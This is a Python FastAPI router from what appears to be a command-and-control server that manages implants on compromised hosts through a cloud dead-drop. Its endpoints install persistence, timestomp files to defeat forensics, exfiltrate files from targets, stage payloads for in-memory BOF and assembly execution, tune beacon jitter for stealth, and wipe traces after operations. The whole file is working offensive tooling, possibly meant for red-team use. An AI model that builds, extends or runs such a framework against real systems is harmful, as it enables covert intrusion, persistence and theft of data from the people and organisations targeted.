"""
server/routers/sessions.py — /api/v1/sessions endpoints.

GET    /api/v1/sessions                         — list all sessions
GET    /api/v1/sessions/{id}                    — full session detail
POST   /api/v1/sessions/{id}/command            — send a raw command (respects lock)
GET    /api/v1/sessions/{id}/history            — CSV command history
DELETE /api/v1/sessions/{id}                    — remove session

Specialised action shortcuts (all respect the command lock):
POST   /api/v1/sessions/{id}/sysinfo            — run /sysinfo
POST   /api/v1/sessions/{id}/sleep              — set sleep interval
POST   /api/v1/sessions/{id}/jitter             — set jitter percent
POST   /api/v1/sessions/{id}/kill               — send /kill
POST   /api/v1/sessions/{id}/persist            — persist shorthand (install|remove|check)
POST   /api/v1/sessions/{id}/persist/probe     — probe all persistence techniques
POST   /api/v1/sessions/{id}/persist/install   — install a technique
POST   /api/v1/sessions/{id}/persist/remove    — remove a technique
POST   /api/v1/sessions/{id}/persist/status    — check status of a technique
POST   /api/v1/sessions/{id}/timestomp          — timestomp a file
POST   /api/v1/sessions/{id}/upload             — stage file on cloud for agent pull
POST   /api/v1/sessions/{id}/download           — exfil file from target via staging
GET    /api/v1/sessions/{id}/artifacts          — tracked artifact registry
GET    /api/v1/sessions/{id}/staging            — list files in cloud staging path
GET    /api/v1/sessions/{id}/staging/{fname}    — proxy-download a staged file
"""

from __future__ import annotations

import csv
import hashlib as _hashlib
import io
import json as _json
import mimetypes as _mt
import os
import re as _re
from datetime import datetime, timezone
from core import tz as _tz
from pathlib import Path
from typing import List, Optional

from fastapi import APIRouter, Depends, File, HTTPException, Request, UploadFile, status
from fastapi.responses import StreamingResponse
from pydantic import BaseModel

from server.models import (
    ArtifactEntry,
    CommandRequest,
    CommandResponse,
    DownloadedFile,
    HistoryEntry,
    JitterRequest,
    PersistRequest,
    PersistProbeRequest,
    PersistTechniqueRequest,
    SessionDetail,
    SessionSummary,
    SleepRequest,
    StagedFile,
    TimestompRequest,
    _session_summary,
)
from server.routers.auth import get_current_user
from server.session import ServerSessionManager

router = APIRouter(prefix="/api/v1/sessions", tags=["sessions"])


def _sm(request: Request) -> ServerSessionManager:
    return request.app.state.sm


# ── helpers ───────────────────────────────────────────────────────────────────

def _session_detail(session, pending) -> dict:
    d = _session_summary(session, pending)
    snap = session.state.snapshot()
    d.update({
        "folder_path":    session.profile.folder_path,
        "input_file":     session.profile.input_file,
        "output_file":    session.profile.output_file,
        "heartbeat_file": session.profile.heartbeat_file,
        "base_sleep":     session.profile.base_sleep,
        "jitter_percent": session.profile.jitter_percent,
        "blob_path":      session.profile.blob_path,
        "blob_path_win":  session.profile.blob_path_win,
        "key_mismatch":   snap.get("key_mismatch", False),
        "agent_pid":      snap.get("agent_pid", ""),
        "agent_process":  snap.get("agent_process", ""),
        "target_domain":  snap.get("target_domain", ""),
        "target_blob":    snap.get("target_blob", ""),
        "agent_sleep":    session.agent_sleep,
        "agent_jitter":   session.agent_jitter,
        "kill_date":      session.profile.kill_date,
        "window_start":   session.profile.window_start,
        "window_end":     session.profile.window_end,
    })
    return d


async def _send(request, session_id, command, username, display=None):
    sm = _sm(request)
    ok, conflict, cmd_id = await sm.send_command(session_id, command, username, display=display)
    if not ok:
        return CommandResponse(
            ok             = False,
            error          = "Command in flight — another operator holds the lock",
            locked_by      = conflict.issued_by if conflict else None,
            locked_cmd_id  = conflict.cmd_id   if conflict else None,
        )
    ts = _tz.now().isoformat()
    await request.app.state.ws.broadcast({
        "type": "session.command",
        "ts":   ts,
        "payload": {
            "session_id": session_id,
            "cmd_id":     cmd_id,
            "command":    display or command,
            "operator":   username,
            "ts":         ts,
        },
    })
    return CommandResponse(ok=True, cmd_id=cmd_id)


def _require_session(sm, session_id):
    s = sm.get(session_id)
    if not s:
        raise HTTPException(status_code=404, detail="Session not found")
    return s


# ── CRUD ──────────────────────────────────────────────────────────────────────

@router.get("", response_model=List[SessionSummary])
def list_sessions(request: Request, username: str = Depends(get_current_user)):
    sm = _sm(request)
    return [_session_summary(s, sm.pending(s.id)) for s in sm.all()]


@router.get("/{session_id}", response_model=SessionDetail)
def get_session(session_id: str, request: Request,
                username: str = Depends(get_current_user)):
    sm = _sm(request)
    s  = _require_session(sm, session_id)
    return _session_detail(s, sm.pending(session_id))


@router.delete("/{session_id}", status_code=status.HTTP_204_NO_CONTENT)
async def remove_session(session_id: str, request: Request,
                         username: str = Depends(get_current_user)):
    sm = _sm(request)
    if not await sm.remove(session_id):
        raise HTTPException(status_code=404, detail="Session not found")
    await request.app.state.ws.broadcast({
        "type": "session.removed",
        "payload": {"id": session_id, "session_id": session_id, "removed_by": username},
    })


class WipeRequest(BaseModel):
    delete_history:    bool = False
    delete_deploy:     bool = False
    delete_downloads:  bool = False


@router.post("/{session_id}/wipe")
async def wipe_session(session_id: str, body: WipeRequest, request: Request,
                       username: str = Depends(get_current_user)):
    """
    Full teardown streamed as SSE events so the browser can show per-step progress.
    Steps: kill → remove → session_json → deploy_dir → uploads → history → done
    """
    import asyncio, shutil, json as _json_mod

    sm  = _sm(request)
    cfg = request.app.state.cfg
    s   = sm.get(session_id)
    if s is None:
        raise HTTPException(status_code=404, detail="Session not found")

    state   = s.state.snapshot().get("state", "unknown")
    profile = s.profile

    def _evt(step: str, status: str, detail: str = "", files: list[str] | None = None) -> str:
        return "data: " + _json_mod.dumps({
            "step": step, "status": status, "detail": detail,
            "files": files or [],
        }) + "\n\n"

    # Capture transport + timing before sm.remove() so the background thread
    # retains access after the session is removed from the manager.
    _transport   = s.transport
    _agent_sleep = s.agent_sleep
    _ws          = request.app.state.ws
    _loop        = asyncio.get_event_loop()

    async def _stream():
        # ── 0. Notify all operators that a wipe is starting ──────────────────
        snap  = s.state.snapshot()
        _wipe_label = (
            snap.get("target_host")
            or snap.get("hostname")
            or (profile.folder_path.split("/")[-1] if profile.folder_path else None)
            or session_id
        )
        await _ws.broadcast({
            "type": "session.wiping",
            "payload": {
                "session_id": session_id,
                "label": _wipe_label,
                "operator": username,
            },
        })

        # ── 1. KILL ──────────────────────────────────────────────────────────
        kill_sent = False
        try:
            await sm.send_command(session_id, "KILL", username, display="/kill")
            kill_sent = True
            yield _evt("kill", "ok", "KILL sent to agent")
        except Exception as exc:
            yield _evt("kill", "warn", f"Agent offline — KILL queued on dead-drop ({exc})")

        # ── 2. Remove from session manager + broadcast ────────────────────────
        sessions_dir = Path(cfg.session_dir)
        json_name = next(
            (f.name for f in sessions_dir.glob("*.json")
             if session_id in f.name or (
                 profile.provider in f.name and
                 profile.folder_path.split("/")[-1] in f.name
             )),
            None,
        )
        await sm.remove(session_id)   # also deletes the JSON on disk
        await _ws.broadcast({
            "type": "session.removed",
            "payload": {"id": session_id, "session_id": session_id, "removed_by": username},
        })
        yield _evt("remove", "ok", "Session removed from manager")

        # ── 3. Session profile JSON (already removed by sm.remove above) ──────
        if json_name:
            yield _evt("session_json", "ok", "", files=[json_name])
        else:
            yield _evt("session_json", "warn", "No session profile found")

        # ── 4. Deployment directory (conditional) ─────────────────────────────
        if body.delete_deploy:
            deploy_base = Path("deployments")
            deploy_dirs = list(deploy_base.glob(f"*_{session_id}")) if deploy_base.exists() else []
            deleted_dirs, errors_dirs = [], []
            for dd in deploy_dirs:
                if dd.is_dir():
                    try:
                        shutil.rmtree(dd)
                        deleted_dirs.append(dd.name)
                    except Exception as exc:
                        errors_dirs.append(str(exc))
            if deleted_dirs:
                yield _evt("deploy_dir", "ok", "", files=deleted_dirs)
            elif errors_dirs:
                yield _evt("deploy_dir", "error", errors_dirs[0])
            else:
                yield _evt("deploy_dir", "warn", "No deployment directory found")
        else:
            yield _evt("deploy_dir", "skip", "Deployment directory preserved")

        # ── 5. Upload records ──────────────────────────────────────────────────
        log_dir = Path(cfg.log_dir)
        deleted_ul = []
        for f in log_dir.glob(f"uploads_{session_id}.json"):
            try:
                f.unlink()
                deleted_ul.append(f.name)
            except Exception:
                pass
        if deleted_ul:
            yield _evt("uploads", "ok", "", files=deleted_ul)
        else:
            yield _evt("uploads", "skip", "No upload records found")

        # ── 6. Downloads folder (conditional) ─────────────────────────────────
        if body.delete_downloads:
            dl_dir = _DL_ROOT / session_id
            if dl_dir.exists() and dl_dir.is_dir():
                try:
                    shutil.rmtree(dl_dir)
                    yield _evt("downloads", "ok", "", files=[dl_dir.name])
                except Exception as exc:
                    yield _evt("downloads", "error", str(exc))
            else:
                yield _evt("downloads", "warn", "No downloads folder found")
        else:
            yield _evt("downloads", "skip", "Downloads folder preserved")

        # ── 7. History CSV (conditional) ──────────────────────────────────────
        if body.delete_history:
            deleted_csv = []
            for f in log_dir.glob(f"*_{session_id}.csv"):
                try:
                    f.unlink()
                    deleted_csv.append(f.name)
                except Exception:
                    pass
            if deleted_csv:
                yield _evt("history", "ok", "", files=deleted_csv)
            else:
                yield _evt("history", "warn", "No history log found")
        else:
            yield _evt("history", "skip", "History log preserved")

        # ── 8. Cloud cleanup — background ─────────────────────────────────────
        # Wait one full beacon cycle so the agent polls the KILL before we
        # delete the cloud folder. Runs in a daemon thread so the operator is
        # not blocked. Progress is pushed via WebSocket when done.
        _wait = (_agent_sleep + 5) if (kill_sent and state in ("online", "idle")) else 0

        def _bg_cloud_cleanup():
            import time
            if _wait:
                time.sleep(_wait)
            errors = []
            try:
                _transport.delete(profile.output_path)
            except Exception as exc:
                errors.append(f"output: {exc}")
            try:
                _transport.delete(profile.heartbeat_path)
            except Exception as exc:
                errors.append(f"heartbeat: {exc}")
            try:
                _transport.delete_folder(profile.folder_path)
            except Exception as exc:
                errors.append(f"folder: {exc}")
            # Notify all operators via WebSocket from the background thread.
            import asyncio as _aio
            _status  = "error" if errors else "ok"
            _detail  = "; ".join(errors) if errors else "Cloud folder and files deleted"
            _aio.run_coroutine_threadsafe(
                _ws.broadcast({
                    "type": "session.wipe_done",
                    "payload": {
                        "session_id": session_id,
                        "status":     _status,
                        "detail":     _detail,
                        "wait_s":     _wait,
                    },
                }),
                _loop,
            )

        import threading
        threading.Thread(target=_bg_cloud_cleanup, daemon=True,
                         name=f"wipe-{session_id}").start()

        _wait_msg = f" (cloud cleanup in background after {_wait}s wait)" if _wait else " (cloud cleanup in background)"
        yield _evt("cloud_cleanup", "pending", f"Background cloud cleanup started{_wait_msg}")

        # ── Done ───────────────────────────────────────────────────────────────
        yield _evt("done", "ok", "")

    return StreamingResponse(_stream(), media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


# ── command dispatch ──────────────────────────────────────────────────────────

@router.post("/{session_id}/command", response_model=CommandResponse)
async def send_command(session_id: str, body: CommandRequest, request: Request,
                       username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    return await _send(request, session_id, body.command, username, display=body.display)


@router.post("/{session_id}/sysinfo", response_model=CommandResponse)
async def sysinfo(session_id: str, request: Request,
                  username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    return await _send(request, session_id, "SYSINFO", username, display="/sysinfo")


@router.post("/{session_id}/sleep", response_model=CommandResponse)
async def set_sleep(session_id: str, body: SleepRequest, request: Request,
                    username: str = Depends(get_current_user)):
    sm = _sm(request)
    s  = _require_session(sm, session_id)
    if body.seconds < 5 or body.seconds > 86400:
        raise HTTPException(status_code=422, detail="seconds must be 5–86400")
    # Save desired value but defer timing update until agent confirms
    s._pending_sleep         = body.seconds
    s.profile.base_sleep     = body.seconds
    sm.save_session(session_id)
    result = await _send(request, session_id, f"SLEEP:{body.seconds}", username,
                         display=f"/sleep {body.seconds}")
    if result.ok and result.cmd_id:
        s._pending_sleep_cmd = result.cmd_id
    return result


@router.post("/{session_id}/jitter", response_model=CommandResponse)
async def set_jitter(session_id: str, body: JitterRequest, request: Request,
                     username: str = Depends(get_current_user)):
    sm = _sm(request)
    s  = _require_session(sm, session_id)
    if body.percent < 0 or body.percent > 100:
        raise HTTPException(status_code=422, detail="percent must be 0–100")
    # Save desired value but defer timing update until agent confirms
    s._pending_jitter            = body.percent
    s.profile.jitter_percent     = body.percent
    sm.save_session(session_id)
    result = await _send(request, session_id, f"JITTER:{body.percent}", username,
                         display=f"/jitter {body.percent}")
    if result.ok and result.cmd_id:
        s._pending_jitter_cmd = result.cmd_id
    return result


@router.post("/{session_id}/kill", response_model=CommandResponse)
async def kill_session(session_id: str, request: Request,
                       username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    return await _send(request, session_id, "KILL", username, display="/kill")


@router.post("/{session_id}/persist", response_model=CommandResponse)
async def persist(session_id: str, body: PersistRequest, request: Request,
                  username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    if body.action not in ("install", "remove", "check"):
        raise HTTPException(status_code=422, detail="action must be install|remove|check")
    return await _send(request, session_id, f"PERSIST:{body.action}", username,
                       display=f"/persist {body.action}")


@router.post("/{session_id}/persist/probe", response_model=CommandResponse)
async def persist_probe(session_id: str, body: PersistProbeRequest, request: Request,
                        username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    if body.techniques:
        cmd  = f"PERSIST_PROBE:{body.techniques}"
        disp = f"/persist probe {body.techniques}"
    else:
        cmd  = "PERSIST_PROBE"
        disp = "/persist probe"
    return await _send(request, session_id, cmd, username, display=disp)


@router.post("/{session_id}/persist/install", response_model=CommandResponse)
async def persist_install(session_id: str, body: PersistTechniqueRequest, request: Request,
                          username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    return await _send(request, session_id, f"PERSIST_INSTALL:{body.technique}", username,
                       display=f"/persist install {body.technique}")


@router.post("/{session_id}/persist/remove", response_model=CommandResponse)
async def persist_remove(session_id: str, body: PersistTechniqueRequest, request: Request,
                         username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    return await _send(request, session_id, f"PERSIST_REMOVE:{body.technique}", username,
                       display=f"/persist remove {body.technique}")


@router.post("/{session_id}/persist/status", response_model=CommandResponse)
async def persist_status(session_id: str, body: PersistTechniqueRequest, request: Request,
                         username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    return await _send(request, session_id, f"PERSIST_STATUS:{body.technique}", username,
                       display=f"/persist status {body.technique}")


@router.post("/{session_id}/timestomp", response_model=CommandResponse)
async def timestomp(session_id: str, body: TimestompRequest, request: Request,
                    username: str = Depends(get_current_user)):
    _require_session(_sm(request), session_id)
    if body.explicit_time:
        # /timestomp -v "YYYY-MM-DD HH:MM" <target>
        agent_cmd = f"TIMESTOMP_SET:{body.target}:{body.explicit_time}"
        display   = f"/timestomp -v \"{body.explicit_time}\" {body.target}"
    else:
        agent_cmd = f"TIMESTOMP:{body.target}:{body.reference}"
        display   = f"/timestomp {body.target}" + (f" {body.reference}" if body.reference else "")
    return await _send(request, session_id, agent_cmd, username, display=display)


@router.post("/{session_id}/download", response_model=CommandResponse)
async def download_file(session_id: str, request: Request,
                        remote_path: str = "",
                        username: str = Depends(get_current_user)):
    sm = _sm(request)
    s  = _require_session(sm, session_id)
    if not remote_path:
        raise HTTPException(status_code=422, detail="remote_path query param required")
    result = await _send(request, session_id, f"DOWNLOAD:{remote_path}", username,
                         display=f"/download {remote_path}")
    if result.ok and result.cmd_id:
        from pathlib import Path as _P
        s.pending_dl[result.cmd_id] = (_P(remote_path).name, None)
    return result


@router.post("/{session_id}/upload")
async def upload_file(session_id: str, request: Request,
                      remote_path: str = "",
                      file: UploadFile = File(...),
                      username: str = Depends(get_current_user)):
    sm  = _sm(request)
    s   = _require_session(sm, session_id)
    cfg = request.app.state.cfg
    if not remote_path:
        raise HTTPException(status_code=422, detail="remote_path query param required")
    max_bytes = cfg.settings.max_upload_mb * 1024 * 1024
    data = await file.read(max_bytes + 1)
    if len(data) > max_bytes:
        raise HTTPException(
            status_code=413,
            detail=f"File too large (max {cfg.settings.max_upload_mb} MB)",
        )
    from pathlib import PurePosixPath
    safe_name = PurePosixPath(file.filename).name
    if not safe_name or safe_name.startswith("."):
        raise HTTPException(status_code=400, detail="Invalid filename")

    # Encrypt file content + use opaque random filename on cloud
    from providers._crypto import encrypt_staging
    enc_data     = encrypt_staging(data, s.session_key_hex)
    staging_name = os.urandom(8).hex()  # opaque 16-char hex filename
    staging      = s.profile.staging_path + "/" + staging_name

    loop = __import__("asyncio").get_event_loop()
    ok   = await loop.run_in_executor(None, s.transport.upload, staging, enc_data)
    if not ok:
        raise HTTPException(status_code=502, detail="Cloud upload failed")
    agent_cmd = f"UPLOAD:{staging}:{safe_name}:DEST:{remote_path}" if remote_path else f"UPLOAD:{staging}:{safe_name}"
    result = await _send(request, session_id, agent_cmd, username,
                         display=f"/upload {safe_name} → {remote_path}")
    if result.ok and result.cmd_id:
        s.pending_ul[result.cmd_id] = {
            "filename":    safe_name,
            "remote_path": remote_path,
            "staging_path": staging,
            "size":        len(data),
            "timestamp":   _tz.now().isoformat(),
            "cmd_id":      result.cmd_id,
        }
    return {"cloud_path": staging, "command": result}


# ── in-memory execution (BOF / Assembly / memexec) ────────────────────────────

@router.post("/{session_id}/exec/inline")
async def exec_inline(session_id: str, request: Request,
                      exec_type: str = "",
                      args: str = "",
                      file: UploadFile = File(...),
                      username: str = Depends(get_current_user)):
    """Stage a binary and send an in-memory execution command."""
    sm  = _sm(request)
    s   = _require_session(sm, session_id)
    cfg = request.app.state.cfg

    if exec_type not in ("bof", "assembly", "memexec"):
        raise HTTPException(status_code=422, detail="exec_type must be 'bof', 'assembly', or 'memexec'")

    max_bytes = cfg.settings.max_upload_mb * 1024 * 1024
    data = await file.read(max_bytes + 1)
    if len(data) > max_bytes:
        raise HTTPException(status_code=413, detail=f"File too large (max {cfg.settings.max_upload_mb} MB)")

    from pathlib import PurePosixPath
    safe_name = PurePosixPath(file.filename).name if file.filename else "payload"

    from providers._crypto import encrypt_staging
    enc_data     = encrypt_staging(data, s.session_key_hex)
    staging_name = os.urandom(8).hex()
    staging      = s.profile.staging_path + "/" + staging_name

    loop = __import__("asyncio").get_event_loop()
    ok   = await loop.run_in_executor(None, s.transport.upload, staging, enc_data)
    if not ok:
        raise HTTPException(status_code=502, detail="Cloud upload failed")

    cmd_map = {"bof": f"BOF_EXEC:{staging}:{args}", "assembly": f"ASSEMBLY_EXEC:{staging}:{args}", "memexec": f"MEMEXEC:{staging}:{args}"}
    disp_map = {"bof": f"/bof {safe_name} {args}".strip(), "assembly": f"/assembly {safe_name} {args}".strip(), "memexec": f"/memexec {safe_name} {args}".strip()}
    result = await _send(request, session_id, cmd_map[exec_type], username, display=disp_map[exec_type])
    return {"cloud_path": staging, "exec_type": exec_type, "command": result}


# ── poll control ──────────────────────────────────────────────────────────────

@router.post("/{session_id}/poll/stop", status_code=status.HTTP_204_NO_CONTENT)
async def poll_stop(session_id: str, request: Request,
                    username: str = Depends(get_current_user)):
    sm = _sm(request)
    s  = _require_session(sm, session_id)
    sm.stop_polling(session_id)
    host = s.state.snapshot().get("target_host", session_id)
    ws   = request.app.state.ws
    await ws.broadcast({"type": "session.update",      "payload": _session_summary(s, sm.pending(session_id))})
    await ws.broadcast({"type": "session.poll.stopped", "payload": {"session_id": session_id, "host": host, "by": username}})


@router.post("/{session_id}/poll/resume", status_code=status.HTTP_204_NO_CONTENT)
async def poll_resume(session_id: str, request: Request,
                      username: str = Depends(get_current_user)):
    sm = _sm(request)
    s  = _require_session(sm, session_id)
    sm.resume_polling(session_id)
    host = s.state.snapshot().get("target_host", session_id)
    ws   = request.app.state.ws
    await ws.broadcast({"type": "session.update",       "payload": _session_summary(s, sm.pending(session_id))})
    await ws.broadcast({"type": "session.poll.resumed",  "payload": {"session_id": session_id, "host": host, "by": username}})


# ── history ───────────────────────────────────────────────────────────────────

@router.get("/{session_id}/history", response_model=List[HistoryEntry])
def get_history(session_id: str, request: Request,
                username: str = Depends(get_current_user)):
    sm = _sm(request)
    _require_session(sm, session_id)
    log_dir = request.app.state.cfg.log_dir
    # Last row per cmd_id wins — pending rows (empty resp) are superseded by completed rows
    by_cmd_id: dict = {}
    no_id_entries: list = []
    for csv_file in Path(log_dir).glob(f"*_{session_id}.csv"):
        try:
            with open(csv_file, newline="") as f:
                for row in csv.reader(f):
                    if len(row) < 5 or row[0].startswith("---") or row[0] == "timestamp":
                        continue
                    ts, sid, cid, cmd, resp = row[0], row[1], row[2], row[3], row[4]
                    operator = row[5] if len(row) > 5 else ""
                    if cid in ("ARTIFACT", "ARTIFACT_REMOVED"):
                        continue
                    entry = HistoryEntry(
                        timestamp=ts, session_id=sid, cmd_id=cid,
                        command=cmd, response=resp, operator=operator,
                    )
                    if cid:
                        by_cmd_id[cid] = entry
                    else:
                        no_id_entries.append(entry)
        except Exception:
            continue
    entries = list(by_cmd_id.values()) + no_id_entries
    entries.sort(key=lambda e: e.timestamp)
    return entries


# ── artifacts ─────────────────────────────────────────────────────────────────

@router.get("/{session_id}/artifacts", response_model=List[ArtifactEntry])
def get_artifacts(session_id: str, request: Request,
                  username: str = Depends(get_current_user)):
    sm = _sm(request)
    s  = _require_session(sm, session_id)
    return s.hist.artifacts()


# ── downloaded files (files saved via /download on the operator machine) ─────

_SAVED_RE = _re.compile(r'^saved:\s+(.+?)\s+\(\s*([0-9,]+)\s+bytes\)')
_DL_ROOT  = Path("downloads").resolve()


def _is_downloadable(local_path: str) -> bool:
    try:
        return str(Path(local_path).resolve()).startswith(str(_DL_ROOT))
    except Exception:
        return False


def _md5_file(path: str) -> str | None:
    try:
        h = _hashlib.md5()
        with open(path, "rb") as fh:
            for chunk in iter(lambda: fh.read(65536), b""):
                h.update(chunk)
        return h.hexdigest()
    except OSError:
        return None


@router.get("/{session_id}/downloads", response_model=List[DownloadedFile])
def list_downloads(session_id: str, request: Request,
                   username: str = Depends(get_current_user)):
    sm = _sm(request)
    _require_session(sm, session_id)
    log_dir  = request.app.state.cfg.log_dir
    entries: list[DownloadedFile] = []
    seen:    set[str] = set()

    for csv_file in Path(log_dir).glob(f"*_{session_id}.csv"):
        try:
            with open(csv_file, newline="", encoding="utf-8", errors="replace") as f:
                for row in csv.reader(f):
                    if len(row) < 5:
                        continue
                    ts, _, cid, cmd, resp = row[0], row[1], row[2], row[3], row[4]
                    if not resp.startswith("saved: "):
                        continue
                    m = _SAVED_RE.match(resp)
                    if not m:
                        continue
                    local_path = m.group(1).strip()
                    if local_path in seen:
                        continue
                    if not Path(local_path).exists():
                        continue
                    seen.add(local_path)
                    try:
                        size_bytes = int(m.group(2).replace(",", ""))
                    except ValueError:
                        size_bytes = None
                    # cmd is stored as "/download <remote_path>"
                    remote_path = cmd.removeprefix("/download").strip() or None
                    p = Path(local_path)
                    mime_type, _ = _mt.guess_type(local_path)
                    entries.append(DownloadedFile(
                        filename     = p.name,
                        local_path   = local_path,
                        remote_path  = remote_path,
                        size_bytes   = size_bytes,
                        timestamp    = ts,
                        cmd_id       = cid,
                        exists       = True,
                        downloadable = _is_downloadable(local_path),
                        md5          = _md5_file(local_path),
                        mime_type    = mime_type,
                    ))
        except Exception:
            continue

    entries.sort(key=lambda e: e.timestamp)
    return entries


@router.get("/{session_id}/downloads/{fname:path}")
async def serve_downloaded_file(session_id: str, fname: str, request: Request,
                                username: str = Depends(get_current_user)):
    sm = _sm(request)
    _require_session(sm, session_id)
    target = (_DL_ROOT / fname).resolve()
    # path-traversal guard
    if not str(target).startswith(str(_DL_ROOT)):
        from fastapi import HTTPException as _HTTPException
        raise _HTTPException(status_code=403, detail="Access denied")
    if not target.exists():
        from fastapi import HTTPException as _HTTPException
        raise _HTTPException(status_code=404, detail="File not found")
    from fastapi.responses import FileResponse
    return FileResponse(str(target), filename=target.name)


@router.delete("/{session_id}/downloads/{fname:path}", status_code=status.HTTP_204_NO_CONTENT)
async def delete_downloaded_file(session_id: str, fname: str, request: Request,
                                 username: str = Depends(get_current_user)):
    sm = _sm(request)
    _require_session(sm, session_id)
    target = (_DL_ROOT / fname).resolve()
    if not str(target).startswith(str(_DL_ROOT)):
        raise HTTPException(status_code=403, detail="Access denied")
    if not target.exists():
        raise HTTPException(status_code=404, detail="File not found")
    target.unlink()
    await request.app.state.ws.broadcast({
        "type": "session.artifacts.changed",
        "ts":   _tz.now().isoformat(),
        "payload": {"session_id": session_id},
    })


# ── upload records ────────────────────────────────────────────────────────────

@router.get("/{session_id}/uploads")
def list_uploads(session_id: str, request: Request,
                 username: str = Depends(get_current_user)):
    s = _require_session(_sm(request), session_id)
    path = s.hist._log_dir / f"uploads_{session_id}.json"
    if not path.exists():
        return []
    try:
        return _json.loads(path.read_text())
    except Exception:
        return []


@router.patch("/{session_id}/uploads", status_code=status.HTTP_204_NO_CONTENT)
async def toggle_upload_status(session_id: str, request: Request,
                               remote_path: str = "",
                               action: str = "remove",  # "remove" | "restore"
                               username: str = Depends(get_current_user)):
    s = _require_session(_sm(request), session_id)
    path = s.hist._log_dir / f"uploads_{session_id}.json"
    if not path.exists() or not remote_path:
        return
    try:
        records = _json.loads(path.read_text())
        for r in records:
            if r.get("remote_path") == remote_path:
                if action == "restore":
                    r.pop("status", None)
                else:
                    r["status"] = "removed"
        path.write_text(_json.dumps(records, indent=2))
    except Exception:
        pass
    await request.app.state.ws.broadcast({
        "type": "session.artifacts.changed",
        "ts": _tz.now().isoformat(),
        "payload": {"session_id": session_id},
    })


# ── staging proxy ─────────────────────────────────────────────────────────────

@router.get("/{session_id}/staging", response_model=List[StagedFile])
def list_staging(session_id: str, request: Request,
                 username: str = Depends(get_current_user)):
    sm = _sm(request)
    s  = _require_session(sm, session_id)
    # Staging files are tracked as artifacts of type "staged_file"
    arts = [a for a in s.hist.artifacts() if a.get("type") == "staged_file"]
    result = []
    for a in arts:
        path = a.get("path", "")
        result.append(StagedFile(name=path.split("/")[-1], path=path))
    return result


@router.get("/{session_id}/deploy_package")
def get_deploy_package(session_id: str, request: Request,
                       username: str = Depends(get_current_user)):
    """Return a zip of the deployment artifacts for the given session."""
    import zipfile
    sm = _sm(request)
    _require_session(sm, session_id)
    deploy_base = Path("deployments")
    deploy_dir  = None
    if deploy_base.exists():
        for d in deploy_base.iterdir():
            if d.is_dir() and d.name.endswith(f"_{session_id}"):
                deploy_dir = d
                break
    if not deploy_dir:
        raise HTTPException(status_code=404,
                            detail=f"Deploy package not found for session {session_id}")
    # Excluded from ZIP — only what the operator actually needs to deploy reaches the archive:
    #   keys/          — private_key.pem + session_key.hex: server-only secrets
    #   cargo_build.log — omitted above; build-server path/hostname OPSEC leak
    #   .<p>_creds     — cloud provider credentials (OAuth tokens, AWS keys, etc.)
    #   cargo_build.log — build-server path/hostname OPSEC leak, zero operational value
    _CRED_SUFFIXES = ("_refresh_token", "_access_token", "_creds")
    _KEYS_DIR      = deploy_dir / "keys"
    _EXCLUDE_NAMES = {"cargo_build.log"}
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for f in deploy_dir.rglob("*"):
            if not f.is_file():
                continue
            try:
                f.relative_to(_KEYS_DIR)
                continue  # inside keys/ — skip
            except ValueError:
                pass
            if f.name in _EXCLUDE_NAMES:
                continue
            if f.name.startswith(".") and any(f.name.endswith(s) for s in _CRED_SUFFIXES):
                continue
            zf.write(f, f.relative_to(deploy_dir))
    buf.seek(0)
    return StreamingResponse(
        buf,
        media_type="application/zip",
        headers={"Content-Disposition": f'attachment; filename="deploy_{session_id}.zip"'},
    )


@router.get("/{session_id}/staging/{fname:path}")
async def download_staged(session_id: str, fname: str, request: Request,
                           username: str = Depends(get_current_user)):
    sm   = _sm(request)
    s    = _require_session(sm, session_id)
    path = s.profile.staging_path + "/" + fname.lstrip("/")
    loop = __import__("asyncio").get_event_loop()
    data = await loop.run_in_executor(None, s.transport.download, path)
    if data is None:
        raise HTTPException(status_code=404, detail="Staged file not found on cloud")
    return StreamingResponse(
        io.BytesIO(data),
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{fname.split("/")[-1]}"'},
    )
